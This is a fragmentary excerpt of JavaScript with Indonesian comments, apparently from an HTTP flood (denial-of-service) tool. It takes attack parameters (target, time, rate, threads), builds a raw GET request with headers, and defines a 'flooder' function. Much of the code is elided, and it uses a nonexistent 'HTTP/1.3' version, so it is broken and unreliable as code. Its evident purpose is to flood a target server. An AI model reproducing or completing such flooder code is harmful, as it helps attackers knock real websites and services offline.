...
//attack target time rate thread kalau host itu kayak lebih ke simpan targetnya yah
...
function loadSettings(target, host) {//setting request headers di sini ya 
  var rw =
    `GET ` +
    target +
    " HTTP/1.3\r\nHost: " +
...
function starter() {
  ...
  function flooder() {//flooder simple brok
